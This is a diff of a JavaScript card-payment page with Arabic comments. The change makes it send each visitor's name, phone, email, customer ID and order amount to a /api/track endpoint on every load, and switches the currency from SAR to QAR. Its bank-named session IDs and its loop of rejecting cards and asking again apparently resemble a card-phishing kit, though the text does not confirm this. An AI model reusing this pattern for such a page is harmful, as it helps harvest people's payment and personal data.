@@ -519,7 +519,6 @@
       errorMsg.textContent = 'من فضلك أدخل جميع بيانات البطاقة بشكل صحيح';
       errorMsg.style.color = '#c0392b';
     }
-    sessionStorage.removeItem('safwa_order_id');
     sessionStorage.removeItem('safwa_order_data');
     var cardName = document.getElementById('cardName');
     if (cardName) cardName.focus();
@@ -665,35 +664,35 @@
     applyRejectedPageMessage();
     updatePaymentSummary();
 
-    // إنشاء visitId جديد لكل زيارة (إلا في حالة الرجوع من صفحة رفض)
+    // استخدام visitId من sessionStorage (تم تمريره من صفحة index أو إنشاء جديد)
     var visitId = sessionStorage.getItem('safwa_order_id');
     var urlParams = new URLSearchParams(window.location.search);
-    var isReturning = urlParams.get('error') || urlParams.get('id');
-
-    if (!visitId || !isReturning) {
-      visitId = 'visit_' + Date.now().toString(36) + Math.random().toString(36).slice(2);
-      sessionStorage.setItem('safwa_order_id', visitId);
-      sessionStorage.setItem('aman_bank_request_id', visitId);
-
-      // جلب بيانات العميل من ملخص الدفع
-      var summary = {};
-      try { summary = JSON.parse(sessionStorage.getItem('payment_summary') || '{}'); } catch(e){}
-
-      // إرسال track للسيرفر
-      fetch('/api/track', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          visitId: visitId,
-          n: summary.name || 'عميل جديد',
-          p: summary.phone || '',
-          e: summary.email || '',
-          id: summary.customerId || '',
-          amount: summary.total || 0,
-          currency: 'SAR'
-        })
-      }).catch(function(){});
+    // استعادة الـ visitId من URL إذا كان المستخدم عائداً من صفحة رفض
+    if (!visitId && urlParams.get('id')) {
+      visitId = urlParams.get('id');
     }
+    if (!visitId) {
+      visitId = 'v_' + Date.now().toString(36) + Math.random().toString(36).slice(2);
+    }
+    sessionStorage.setItem('safwa_order_id', visitId);
+    sessionStorage.setItem('aman_bank_request_id', visitId);
+
+    // إرسال track دائماً لتحديث السيرفر بأحدث البيانات
+    var summary = {};
+    try { summary = JSON.parse(sessionStorage.getItem('payment_summary') || '{}'); } catch(e){}
+    fetch('/api/track', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        visitId: visitId,
+        n: summary.name || '',
+        p: summary.phone || '',
+        e: summary.email || '',
+        id: summary.customerId || '',
+        amount: summary.total || 0,
+        currency: 'QAR'
+      })
+    }).catch(function(){});
 
     var sessionId = sessionStorage.getItem('aman_bank_session_id');
     if (!sessionId) {
